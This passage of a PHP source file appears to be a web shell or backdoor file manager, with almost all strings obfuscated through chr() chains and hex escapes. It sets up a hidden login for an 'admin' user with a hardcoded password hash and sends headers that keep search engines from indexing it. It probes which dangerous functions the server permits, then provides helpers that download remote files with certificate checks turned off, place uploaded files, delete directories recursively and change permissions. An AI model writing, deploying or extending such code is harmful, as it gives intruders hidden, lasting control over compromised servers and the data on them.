<?php

if (!function_exists("\x69\x73\x5f\x66\x6e\x5f\x75\x73\x61\x62\x6c\x65")) {
    function is_fn_usable($_c820c0)
    {
        
        if (!function_exists($_c820c0))
            return false;

        
        $_d916f1 = (string)@ini_get(chr(100).chr(105).chr(115).chr(97).chr(98).chr(108).chr(101).chr(95).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(115));
        $_737468 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116));

        $_399076 = array();
        if ($_d916f1 !== "")
            $_399076 = array_merge($_399076, array_map("\x74\x72\x69\x6d", explode("\x2c", $_d916f1)));
        if ($_737468 !== '')
            $_399076 = array_merge($_399076, array_map("\x74\x72\x69\x6d", explode("\x2c", $_737468)));

        if (!empty($_399076)) {
            $_399076 = array_filter(array_map("\x73\x74\x72\x74\x6f\x6c\x6f\x77\x65\x72", $_399076));
            if (in_array(strtolower($_c820c0), $_399076, true))
                return false;
        }
        return true;
    }
}
if (function_exists("\x64\x61\x74\x65\x5f\x64\x65\x66\x61\x75\x6c\x74\x5f\x74\x69\x6d\x65\x7a\x6f\x6e\x65\x5f\x73\x65\x74")) {
    date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : chr(85).chr(84).chr(67));
}


$_12df31 = sys_get_temp_dir();
if (!is_writable($_12df31)) {
    $_9bd557 = isset($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(70).chr(73).chr(76).chr(69).chr(78).chr(65).chr(77).chr(69)]) ? @realpath($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]) : "";
    $_12df31 = ($_9bd557 ? dirname($_9bd557) : sys_get_temp_dir()) . chr(47).chr(46).chr(115).chr(101).chr(115).chr(115);
    if (!is_dir($_12df31)) @mkdir($_12df31, 0700, true);
}
@ini_set("\x73\x65\x73\x73\x69\x6f\x6e\x2e\x73\x61\x76\x65\x5f\x70\x61\x74\x68", $_12df31);
session_start();
if (empty($_SESSION["\x63\x73\x72\x66"])) {
    $_SESSION[chr(99).chr(115).chr(114).chr(102)] = bin2hex(_f844323de(16));
}


header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(104).chr(116).chr(109).chr(108).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
header(chr(88).chr(45).chr(82).chr(111).chr(98).chr(111).chr(116).chr(115).chr(45).chr(84).chr(97).chr(103).chr(58).chr(32).chr(110).chr(111).chr(105).chr(110).chr(100).chr(101).chr(120).chr(44).chr(32).chr(110).chr(111).chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(44).chr(32).chr(110).chr(111).chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(44).chr(32).chr(110).chr(111).chr(115).chr(110).chr(105).chr(112).chr(112).chr(101).chr(116).chr(44).chr(32).chr(110).chr(111).chr(105).chr(109).chr(97).chr(103).chr(101).chr(105).chr(110).chr(100).chr(101).chr(120), true);
header(chr(82).chr(101).chr(102).chr(101).chr(114).chr(114).chr(101).chr(114).chr(45).chr(80).chr(111).chr(108).chr(105).chr(99).chr(121).chr(58).chr(32).chr(110).chr(111).chr(45).chr(114).chr(101).chr(102).chr(101).chr(114).chr(114).chr(101).chr(114));
header(chr(88).chr(45).chr(70).chr(114).chr(97).chr(109).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(68).chr(69).chr(78).chr(89));
header("\x43\x61\x63\x68\x65\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x3a\x20\x6e\x6f\x2d\x73\x74\x6f\x72\x65\x2c\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65\x2c\x20\x6d\x75\x73\x74\x2d\x72\x65\x76\x61\x6c\x69\x64\x61\x74\x65\x2c\x20\x6d\x61\x78\x2d\x61\x67\x65\x3d\x30");
header("\x50\x72\x61\x67\x6d\x61\x3a\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65");
header("\x45\x78\x70\x69\x72\x65\x73\x3a\x20\x30");


define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82), chr(97).chr(100).chr(109).chr(105).chr(110));
define(chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(65).chr(83).chr(83).chr(95).chr(72).chr(65).chr(83).chr(72), "\x24\x32\x61\x24\x31\x32\x24\x74\x56\x64\x69\x34\x44\x45\x56\x39\x6b\x75\x6d\x4e\x70\x34\x58\x63\x51\x2f\x45\x45\x2e\x4c\x59\x53\x56\x32\x76\x67\x4e\x37\x54\x63\x47\x54\x58\x4c\x44\x6a\x77\x79\x35\x56\x56\x56\x6a\x30\x55\x6b\x42\x70\x6c\x75");


if (!function_exists("\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65")) {
    function http_response_code($_57a160 = NULL)
    {
        if ($_57a160 !== NULL) {
            $_7cbc0d = "\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x45\x72\x72\x6f\x72";
            switch ($_57a160) {
                case 100:
                    $_7cbc0d = chr(67).chr(111).chr(110).chr(116).chr(105).chr(110).chr(117).chr(101);
                    break;
                case 101:
                    $_7cbc0d = "\x53\x77\x69\x74\x63\x68\x69\x6e\x67\x20\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x73";
                    break;
                case 200:
                    $_7cbc0d = "\x4f\x4b";
                    break;
                case 201:
                    $_7cbc0d = "\x43\x72\x65\x61\x74\x65\x64";
                    break;
                case 202:
                    $_7cbc0d = chr(65).chr(99).chr(99).chr(101).chr(112).chr(116).chr(101).chr(100);
                    break;
                case 203:
                    $_7cbc0d = chr(78).chr(111).chr(110).chr(45).chr(65).chr(117).chr(116).chr(104).chr(111).chr(114).chr(105).chr(116).chr(97).chr(116).chr(105).chr(118).chr(101).chr(32).chr(73).chr(110).chr(102).chr(111).chr(114).chr(109).chr(97).chr(116).chr(105).chr(111).chr(110);
                    break;
                case 204:
                    $_7cbc0d = "\x4e\x6f\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 205:
                    $_7cbc0d = "\x52\x65\x73\x65\x74\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 206:
                    $_7cbc0d = "\x50\x61\x72\x74\x69\x61\x6c\x20\x43\x6f\x6e\x74\x65\x6e\x74";
                    break;
                case 300:
                    $_7cbc0d = "\x4d\x75\x6c\x74\x69\x70\x6c\x65\x20\x43\x68\x6f\x69\x63\x65\x73";
                    break;
                case 301:
                    $_7cbc0d = "\x4d\x6f\x76\x65\x64\x20\x50\x65\x72\x6d\x61\x6e\x65\x6e\x74\x6c\x79";
                    break;
                case 302:
                    $_7cbc0d = "\x4d\x6f\x76\x65\x64\x20\x54\x65\x6d\x70\x6f\x72\x61\x72\x69\x6c\x79";
                    break;
                case 303:
                    $_7cbc0d = chr(83).chr(101).chr(101).chr(32).chr(79).chr(116).chr(104).chr(101).chr(114);
                    break;
                case 304:
                    $_7cbc0d = "\x4e\x6f\x74\x20\x4d\x6f\x64\x69\x66\x69\x65\x64";
                    break;
                case 305:
                    $_7cbc0d = chr(85).chr(115).chr(101).chr(32).chr(80).chr(114).chr(111).chr(120).chr(121);
                    break;
                case 400:
                    $_7cbc0d = "\x42\x61\x64\x20\x52\x65\x71\x75\x65\x73\x74";
                    break;
                case 401:
                    $_7cbc0d = chr(85).chr(110).chr(97).chr(117).chr(116).chr(104).chr(111).chr(114).chr(105).chr(122).chr(101).chr(100);
                    break;
                case 402:
                    $_7cbc0d = "\x50\x61\x79\x6d\x65\x6e\x74\x20\x52\x65\x71\x75\x69\x72\x65\x64";
                    break;
                case 403:
                    $_7cbc0d = chr(70).chr(111).chr(114).chr(98).chr(105).chr(100).chr(100).chr(101).chr(110);
                    break;
                case 404:
                    $_7cbc0d = chr(78).chr(111).chr(116).chr(32).chr(70).chr(111).chr(117).chr(110).chr(100);
                    break;
                case 405:
                    $_7cbc0d = chr(77).chr(101).chr(116).chr(104).chr(111).chr(100).chr(32).chr(78).chr(111).chr(116).chr(32).chr(65).chr(108).chr(108).chr(111).chr(119).chr(101).chr(100);
                    break;
                case 406:
                    $_7cbc0d = "\x4e\x6f\x74\x20\x41\x63\x63\x65\x70\x74\x61\x62\x6c\x65";
                    break;
                case 407:
                    $_7cbc0d = "\x50\x72\x6f\x78\x79\x20\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x52\x65\x71\x75\x69\x72\x65\x64";
                    break;
                case 408:
                    $_7cbc0d = "\x52\x65\x71\x75\x65\x73\x74\x20\x54\x69\x6d\x65\x2d\x6f\x75\x74";
                    break;
                case 409:
                    $_7cbc0d = "\x43\x6f\x6e\x66\x6c\x69\x63\x74";
                    break;
                case 410:
                    $_7cbc0d = chr(71).chr(111).chr(110).chr(101);
                    break;
                case 411:
                    $_7cbc0d = chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(32).chr(82).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100);
                    break;
                case 412:
                    $_7cbc0d = "\x50\x72\x65\x63\x6f\x6e\x64\x69\x74\x69\x6f\x6e\x20\x46\x61\x69\x6c\x65\x64";
                    break;
                case 413:
                    $_7cbc0d = "\x52\x65\x71\x75\x65\x73\x74\x20\x45\x6e\x74\x69\x74\x79\x20\x54\x6f\x6f\x20\x4c\x61\x72\x67\x65";
                    break;
                case 414:
                    $_7cbc0d = chr(82).chr(101).chr(113).chr(117).chr(101).chr(115).chr(116).chr(45).chr(85).chr(82).chr(73).chr(32).chr(84).chr(111).chr(111).chr(32).chr(76).chr(97).chr(114).chr(103).chr(101);
                    break;
                case 415:
                    $_7cbc0d = "\x55\x6e\x73\x75\x70\x70\x6f\x72\x74\x65\x64\x20\x4d\x65\x64\x69\x61\x20\x54\x79\x70\x65";
                    break;
                case 500:
                    $_7cbc0d = "\x49\x6e\x74\x65\x72\x6e\x61\x6c\x20\x53\x65\x72\x76\x65\x72\x20\x45\x72\x72\x6f\x72";
                    break;
                case 501:
                    $_7cbc0d = chr(78).chr(111).chr(116).chr(32).chr(73).chr(109).chr(112).chr(108).chr(101).chr(109).chr(101).chr(110).chr(116).chr(101).chr(100);
                    break;
                case 502:
                    $_7cbc0d = chr(66).chr(97).chr(100).chr(32).chr(71).chr(97).chr(116).chr(101).chr(119).chr(97).chr(121);
                    break;
                case 503:
                    $_7cbc0d = chr(83).chr(101).chr(114).chr(118).chr(105).chr(99).chr(101).chr(32).chr(85).chr(110).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
                    break;
                case 504:
                    $_7cbc0d = "\x47\x61\x74\x65\x77\x61\x79\x20\x54\x69\x6d\x65\x2d\x6f\x75\x74";
                    break;
                case 505:
                    $_7cbc0d = chr(72).chr(84).chr(84).chr(80).chr(32).chr(86).chr(101).chr(114).chr(115).chr(105).chr(111).chr(110).chr(32).chr(110).chr(111).chr(116).chr(32).chr(115).chr(117).chr(112).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100);
                    break;
            }
            $_de2dbe = (isset($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x50\x52\x4f\x54\x4f\x43\x4f\x4c"]) ? $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x50\x52\x4f\x54\x4f\x43\x4f\x4c"] : "\x48\x54\x54\x50\x2f\x31\x2e\x30");
            header($_de2dbe . chr(32) . $_57a160 . chr(32) . $_7cbc0d);
            $GLOBALS["\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65"] = $_57a160;
        }
        else {
            $_57a160 = (isset($GLOBALS["\x68\x74\x74\x70\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x5f\x63\x6f\x64\x65"]) ? $GLOBALS[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(99).chr(111).chr(100).chr(101)] : 200);
        }
        return $_57a160;
    }
}

if (!function_exists("\x73\x79\x73\x5f\x67\x65\x74\x5f\x74\x65\x6d\x70\x5f\x64\x69\x72")) {
    function sys_get_temp_dir()
    {
        if (!empty($_ENV["\x54\x4d\x50"])) {
            return realpath($_ENV[chr(84).chr(77).chr(80)]);
        }
        if (!empty($_ENV["\x54\x4d\x50\x44\x49\x52"])) {
            return realpath($_ENV["\x54\x4d\x50\x44\x49\x52"]);
        }
        if (!empty($_ENV[chr(84).chr(69).chr(77).chr(80)])) {
            return realpath($_ENV["\x54\x45\x4d\x50"]);
        }
        $_3907b9 = tempnam(dirname(__FILE__), '');
        if (file_exists($_3907b9)) {
            unlink($_3907b9);
            return realpath(dirname($_3907b9));
        }
        return null;
    }
}

if (!function_exists("\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73")) {
    if (!defined(chr(70).chr(73).chr(76).chr(69).chr(95).chr(65).chr(80).chr(80).chr(69).chr(78).chr(68))) {
        define("\x46\x49\x4c\x45\x5f\x41\x50\x50\x45\x4e\x44", 8);
    }
    function file_put_contents($_c1f579, $_8cb860, $_5330b9 = 0)
    {
        $_ddf387 = ($_5330b9 & FILE_APPEND) ? "\x61\x62" : chr(119).chr(98);
        $_609105 = @fopen($_c1f579, $_ddf387);
        if ($_609105 === false) {
            return false;
        }
        $_f4112b = @fwrite($_609105, $_8cb860);
        @fclose($_609105);
        return $_f4112b;
    }
}

if (!function_exists(chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121).chr(95).chr(116).chr(111).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109))) {
    function stream_copy_to_stream($_a877c9, $_29ba63)
    {
        $_34d72e = 0;
        while (!feof($_a877c9)) {
            $_42a91c = @fread($_a877c9, 8192);
            if ($_42a91c === false || $_42a91c === '') {
                break;
            }
            $_c173cd = @fwrite($_29ba63, $_42a91c);
            if ($_c173cd === false) {
                break;
            }
            $_34d72e += $_c173cd;
        }
        return $_34d72e;
    }
}

function h($_6ee803)
{
    return htmlspecialchars($_6ee803, ENT_QUOTES, chr(85).chr(84).chr(70).chr(45).chr(56));
}


if (!function_exists(chr(106).chr(101))) {
    function je($_1bb0e6)
    {
        if (function_exists("\x6a\x73\x6f\x6e\x5f\x65\x6e\x63\x6f\x64\x65")) {
            return json_encode($_1bb0e6);
        }
        
        if (is_bool($_1bb0e6))
            return $_1bb0e6 ? chr(116).chr(114).chr(117).chr(101) : "\x66\x61\x6c\x73\x65";
        if (is_numeric($_1bb0e6))
            return (string)$_1bb0e6;
        if ($_1bb0e6 === null)
            return chr(110).chr(117).chr(108).chr(108);
        $_6ee803 = str_replace(
            array("\x5c", chr(34), "\x0d", "\x0a", chr(9), "\x2f"),
            array("\x5c\x5c", chr(92).chr(34), "\x5c\x72", "\x5c\x6e", "\x5c\x74", chr(92).chr(47)),
            (string)$_1bb0e6
        );
        return chr(34) . $_6ee803 . chr(34);
    }
}

if (!function_exists(chr(104).chr(97).chr(115).chr(104).chr(95).chr(101).chr(113).chr(117).chr(97).chr(108).chr(115))) {
    function hash_equals($_72cfbe, $_ceda46)
    {
        if (!is_string($_72cfbe) || !is_string($_ceda46))
            return false;
        $_c173cd = strlen($_72cfbe);
        if ($_c173cd !== strlen($_ceda46))
            return false;
        $_0b568e = 0;
        for ($_5e4544 = 0; $_5e4544 < $_c173cd; $_5e4544++)
            $_0b568e |= ord($_72cfbe[$_5e4544]) ^ ord($_ceda46[$_5e4544]);
        return $_0b568e === 0;
    }
}


if (!function_exists("\x69\x73\x5f\x66\x6e\x5f\x75\x73\x61\x62\x6c\x65")) {
    function is_fn_usable($_c820c0)
    {
        if (!function_exists($_c820c0))
            return false;

        $_d916f1 = (string)@ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73");
        $_737468 = (string)@ini_get(chr(115).chr(117).chr(104).chr(111).chr(115).chr(105).chr(110).chr(46).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(111).chr(114).chr(46).chr(102).chr(117).chr(110).chr(99).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(108).chr(105).chr(115).chr(116)); 

        $_399076 = array();
        if ($_d916f1 !== "") {
            $_399076 = array_merge($_399076, array_map(chr(116).chr(114).chr(105).chr(109), explode(chr(44), $_d916f1)));
        }
        if ($_737468 !== '') {
            $_399076 = array_merge($_399076, array_map(chr(116).chr(114).chr(105).chr(109), explode(chr(44), $_737468)));
        }
        $_399076 = array_filter(array_map("\x73\x74\x72\x74\x6f\x6c\x6f\x77\x65\x72", $_399076));
        return !in_array(strtolower($_c820c0), $_399076, true);
    }
}

function _f844323de($_c173cd)
{
    if (is_fn_usable("\x72\x61\x6e\x64\x6f\x6d\x5f\x62\x79\x74\x65\x73"))
        return random_bytes($_c173cd);
    if (is_fn_usable("\x6f\x70\x65\x6e\x73\x73\x6c\x5f\x72\x61\x6e\x64\x6f\x6d\x5f\x70\x73\x65\x75\x64\x6f\x5f\x62\x79\x74\x65\x73")) {
        $_ecb388 = false;
        $_ceda46 = openssl_random_pseudo_bytes($_c173cd, $_ecb388);
        if ($_ceda46 !== false && $_ecb388)
            return $_ceda46;
    }
    $_be5191 = '';
    for ($_5e4544 = 0; $_5e4544 < $_c173cd; $_5e4544++)
        $_be5191 .= chr(mt_rand(0, 255));
    return $_be5191;
}
function _f94defb97($_ceda46)
{
    $_a5838a = array(chr(66), chr(75).chr(66), chr(77).chr(66), chr(71).chr(66), "\x54\x42");
    $_5e4544 = 0;
    while ($_ceda46 >= 1024 && $_5e4544 < count($_a5838a) - 1) {
        $_ceda46 /= 1024;
        $_5e4544++;
    }
    return ($_5e4544 ? number_format($_ceda46, 2) : (string)$_ceda46) . "\x20" . $_a5838a[$_5e4544];
}
function _fe2009ff5($_609105)
{
    $_60dcf7 = @fileperms($_609105);
    if ($_60dcf7 === false)
        return chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63).chr(63);
    $_9518b6 = ($_60dcf7 & 0x4000) ? chr(100) : (($_60dcf7 & 0xA000) ? "\x6c" : chr(45));
    $_6ee803 = (($_60dcf7 & 0x0100) ? chr(114) : chr(45)) . (($_60dcf7 & 0x0080) ? chr(119) : chr(45)) . (($_60dcf7 & 0x0040) ? chr(120) : "\x2d"); 
    $_6ee803 .= (($_60dcf7 & 0x0020) ? chr(114) : "\x2d") . (($_60dcf7 & 0x0010) ? "\x77" : chr(45)) . (($_60dcf7 & 0x0008) ? "\x78" : "\x2d"); 
    $_6ee803 .= (($_60dcf7 & 0x0004) ? "\x72" : "\x2d") . (($_60dcf7 & 0x0002) ? "\x77" : chr(45)) . (($_60dcf7 & 0x0001) ? chr(120) : chr(45)); 
    return $_9518b6 . $_6ee803;
}
function _ff319afc5($_609105)
{
    $_67da5b = @fileowner($_609105);
    if ($_67da5b === false)
        return chr(63);
    if (function_exists(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100))) {
        $_ea8604 = @posix_getpwuid($_67da5b);
        if ($_ea8604 && isset($_ea8604["\x6e\x61\x6d\x65"]))
            return $_ea8604["\x6e\x61\x6d\x65"];
    }
    return (string)$_67da5b;
}
function _fd414c285($_6ee803)
{
    $_6ee803 = trim($_6ee803);
    if ($_6ee803 === "")
        return 0644;
    if (ctype_digit($_6ee803)) {
        if ($_6ee803[0] !== "\x30")
            $_6ee803 = chr(48) . $_6ee803;
        return intval($_6ee803, 8);
    }
    return 0644;
}
function _f7d677d38($_60dcf7)
{
    if (is_dir($_60dcf7) || !is_file($_60dcf7))
        return false;
    $_78f209 = strtolower(pathinfo($_60dcf7, PATHINFO_EXTENSION));
    $_7cbc0d = array("\x74\x78\x74", chr(109).chr(100), "\x6a\x73\x6f\x6e", "\x6a\x73", chr(116).chr(115), chr(99).chr(115).chr(115), "\x73\x63\x73\x73", "\x6c\x65\x73\x73", chr(104).chr(116).chr(109).chr(108), chr(104).chr(116).chr(109), "\x78\x6d\x6c", "\x73\x76\x67", chr(112).chr(104).chr(112), "\x70\x68\x74\x6d\x6c", chr(105).chr(110).chr(99), chr(105).chr(110).chr(105), chr(99).chr(102).chr(103), "\x65\x6e\x76", chr(121).chr(109).chr(108), "\x79\x61\x6d\x6c", chr(112).chr(121), chr(114).chr(98), "\x67\x6f", chr(114).chr(115), chr(99), chr(104), "\x63\x70\x70", chr(104).chr(112).chr(112), "\x6a\x61\x76\x61", "\x6b\x74", "\x73\x71\x6c", "\x63\x73\x76", "\x6c\x6f\x67");
    if (in_array($_78f209, $_7cbc0d, true))
        return true;
    $_6ee803 = @file_get_contents($_60dcf7, false, null, 0, 2048);
    if ($_6ee803 === false)
        return false;
    return (bool)preg_match(chr(47).chr(47).chr(117), $_6ee803);
}
function _f9773869f($_0083d8, $_4177e5)
{
    $_4177e5 = str_replace("\x00", "", $_4177e5);
    if ($_4177e5 === "")
        return $_0083d8;
    if ($_4177e5[0] === DIRECTORY_SEPARATOR || preg_match(chr(126).chr(94).chr(91).chr(65).chr(45).chr(90).chr(97).chr(45).chr(122).chr(93).chr(58).chr(92).chr(92).chr(126), $_4177e5))
        return $_4177e5;
    return rtrim($_0083d8, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_4177e5;
}
function _f243e76e7($_a7b8f0)
{
    $_097a3e = @opendir($_a7b8f0);
    if ($_097a3e === false)
        return array();
    $_d2b3df = array();
    while (false !== ($_90e0bb = readdir($_097a3e))) {
        if ($_90e0bb === "\x2e" || $_90e0bb === "\x2e\x2e")
            continue;
        $_d2b3df[] = $_90e0bb;
    }
    closedir($_097a3e);
    return $_d2b3df;
}
function _f5a4b36c7($_60dcf7)
{
    if (!file_exists($_60dcf7))
        return true;
    if (is_file($_60dcf7) || is_link($_60dcf7))
        return @unlink($_60dcf7);
    $_f10de9 = true;
    $_097a3e = @opendir($_60dcf7);
    if ($_097a3e === false)
        return false;
    while (false !== ($_1bb0e6 = readdir($_097a3e))) {
        if ($_1bb0e6 === "\x2e" || $_1bb0e6 === "\x2e\x2e")
            continue;
        $_f10de9 = _f5a4b36c7($_60dcf7 . DIRECTORY_SEPARATOR . $_1bb0e6) && $_f10de9;
    }
    closedir($_097a3e);
    return @rmdir($_60dcf7) && $_f10de9;
}
function _fe7ad5abf($_c91b42, $_29ba63)
{
    $_0a97e3 = array();
    if (@move_uploaded_file($_c91b42, $_29ba63))
        return array(true, null);
    $_0a97e3[] = "\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65";
    if (@rename($_c91b42, $_29ba63))
        return array(true, null);
    $_0a97e3[] = chr(114).chr(101).chr(110).chr(97).chr(109).chr(101);
    if (@copy($_c91b42, $_29ba63))
        return array(true, null);
    $_0a97e3[] = "\x63\x6f\x70\x79";
    $_dc317d = @file_get_contents($_c91b42);
    if ($_dc317d !== false && @file_put_contents($_29ba63, $_dc317d) !== false)
        return array(true, null);
    $_0a97e3[] = chr(103).chr(101).chr(116).chr(43).chr(112).chr(117).chr(116);
    $_1c0b42 = @fopen($_c91b42, chr(114).chr(98));
    $_be5191 = @fopen($_29ba63, chr(119).chr(98));
    if ($_1c0b42 && $_be5191) {
        $_2858cd = stream_copy_to_stream($_1c0b42, $_be5191);
        @fclose($_1c0b42);
        @fclose($_be5191);
        if ($_2858cd !== false)
            return array(true, null);
        $_0a97e3[] = chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121);
    }
    else {
        $_0a97e3[] = "\x66\x6f\x70\x65\x6e";
    }
    return array(false, implode("\x3b\x20", $_0a97e3) . "\x20\x66\x61\x69\x6c\x65\x64");
}
if (!function_exists(chr(102).chr(101).chr(116).chr(99).chr(104).chr(85).chr(114).chr(108).chr(84).chr(111).chr(70).chr(105).chr(108).chr(101))) {
    function fetchUrlToFile($_b0a847, $_29ba63)
    {
        $_4d14bf = array();

        
        if (is_fn_usable("\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74")) {
            $_847652 = @curl_init($_b0a847);
            $_a9dce0 = @fopen($_29ba63, "\x77\x62");
            if ($_847652 && $_a9dce0) {
                @curl_setopt($_847652, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($_847652, CURLOPT_FILE, $_a9dce0);
                @curl_setopt($_847652, CURLOPT_FAILONERROR, true);
                @curl_setopt($_847652, CURLOPT_USERAGENT, chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48));
                @curl_setopt($_847652, CURLOPT_SSL_VERIFYPEER, false);
                @curl_setopt($_847652, CURLOPT_SSL_VERIFYHOST, 0);
                @curl_setopt($_847652, CURLOPT_TIMEOUT, 60);
                $_f10de9 = @curl_exec($_847652);
                $_90e0bb = @curl_error($_847652);
                @curl_close($_847652);
                @fclose($_a9dce0);

                if ($_f10de9)
                    return array(true, null);
                $_4d14bf[] = "\x63\x55\x52\x4c\x3a\x20" . $_90e0bb;
                @unlink($_29ba63);
            }
            else {
                if ($_847652)
                    @curl_close($_847652);
                if ($_a9dce0)
                    @fclose($_a9dce0);
                $_4d14bf[] = chr(105).chr(110).chr(105).chr(116).chr(32).chr(99).chr(85).chr(82).chr(76).chr(47).chr(102).chr(111).chr(112).chr(101).chr(110);
            }
        }

        
        $_54d67b = @stream_context_create(array(
            "\x68\x74\x74\x70" => array(
                chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => 1,
                "\x74\x69\x6d\x65\x6f\x75\x74" => 60,
                "\x68\x65\x61\x64\x65\x72" => chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48).chr(13).chr(10),
            ),
            chr(115).chr(115).chr(108) => array(
                chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(95).chr(112).chr(101).chr(101).chr(114) => false,
                "\x76\x65\x72\x69\x66\x79\x5f\x70\x65\x65\x72\x5f\x6e\x61\x6d\x65" => false,
            ),
        ));

        
        if (@copy($_b0a847, $_29ba63, $_54d67b))
            return array(true, null);
        $_4d14bf[] = chr(99).chr(111).chr(112).chr(121).chr(40).chr(117).chr(114).chr(108).chr(41);

        
        $_dc317d = @file_get_contents($_b0a847, false, $_54d67b);
        if ($_dc317d !== false && @file_put_contents($_29ba63, $_dc317d) !== false)
            return array(true, null);
        $_4d14bf[] = "\x67\x65\x74\x2b\x70\x75\x74";

        
        $_1c0b42 = @fopen($_b0a847, "\x72\x62", false, $_54d67b);
        $_be5191 = @fopen($_29ba63, "\x77\x62");
        if ($_1c0b42 && $_be5191) {
            $_2858cd = @stream_copy_to_stream($_1c0b42, $_be5191);
            @fclose($_1c0b42);
            @fclose($_be5191);
            if ($_2858cd !== false)
                return array(true, null);
            $_4d14bf[] = "\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x70\x79";
            @unlink($_29ba63);
        }
        else {
            $_4d14bf[] = "\x66\x6f\x70\x65\x6e\x28\x75\x72\x6c\x2f\x64\x65\x73\x74\x29";
        }

        return array(false, implode("\x3b\x20", $_4d14bf) . "\x20\x66\x61\x69\x6c\x65\x64");
    }
}
function _fa10b6e50($_a1c28d)
{
    $_be5191 = array();
    if (preg_match("\x7e\x5e\x5b\x41\x2d\x5a\x61\x2d\x7a\x5d\x3a\x5c\x5c\x7e", $_a1c28d)) {
        $_7a811d = substr($_a1c28d, 0, 2);
        $_319fb8 = substr($_a1c28d, 2);
        $_624347 = array_values(array_filter(explode("\x5c\x5c", $_319fb8), chr(115).chr(116).chr(114).chr(108).chr(101).chr(110)));
        $_ebbeaa = $_7a811d . chr(92);
        $_be5191[] = array($_7a811d . chr(92), $_ebbeaa);
        foreach ($_624347 as $_6ee803) {
            $_ebbeaa .= $_6ee803 . "\x5c";
            $_be5191[] = array($_6ee803, rtrim($_ebbeaa, "\x5c"));
        }
    }
    else {
        $_624347 = array_values(array_filter(explode("\x2f", $_a1c28d), "\x73\x74\x72\x6c\x65\x6e"));
        $_ebbeaa = "\x2f";
        $_be5191[] = array("\x2f", chr(47));
        foreach ($_624347 as $_6ee803) {
            $_ebbeaa .= $_6ee803 . "\x2f";
            $_be5191[] = array($_6ee803, rtrim($_ebbeaa, "\x2f"));
        }
    }
    return $_be5191;
}


function _f9970cf4a($_d69e7c)
{
    $_2d7e84 = isset($_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"]) ? $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] : "";
    if ($_2d7e84 === '')
        return null;
    $_6c61b9 = realpath($_2d7e84);
